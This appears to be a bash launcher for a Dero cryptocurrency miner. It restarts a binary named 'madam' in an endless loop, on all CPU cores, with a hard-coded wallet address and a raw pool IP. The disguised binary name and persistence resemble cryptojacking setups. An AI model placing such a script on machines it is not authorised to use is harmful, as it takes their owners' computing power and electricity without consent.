#!/bin/bash

while :
do
    ./madam -w dero1qydqwyg0rjmsyfl9g52np38nv645y75l07v9tlxzcz780ezsnuedkqqqekx8w -d 51.222.86.51:443 --popcnt -t $(nproc --al) --show-pool-shares --period 60 --no-colors
    sleep 1
done
